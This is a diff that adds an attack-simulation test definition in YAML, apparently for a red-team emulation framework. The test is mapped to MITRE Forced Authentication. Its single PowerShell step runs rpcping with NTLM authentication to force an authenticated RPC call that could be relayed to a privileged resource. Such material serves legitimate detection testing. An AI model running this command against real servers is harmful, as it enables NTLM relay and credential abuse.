@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Trigger an authenticated RPC call to a target server with no Sign flag set
+description: |-
+    RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)
+    Ref: https://twitter.com/splinter_code/status/1421144623678988298
+args:
+    - name: custom_port
+      type: integer
+      default: "9997"
+    - name: server_ip
+      type: string
+      default: 127.0.0.1
+uuid: 81cfdd7f-1f41-4cc5-9845-bb5149438e37
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1187: Forced Authentication'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: trigger-an-authenticated-rpc-call-to-a-target-server-with-no-sign-flag-set
+      inline: rpcping -s {{.Args.server_ip}} -e {{.Args.custom_port}} /a connect /u NTLM 1>$Null
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
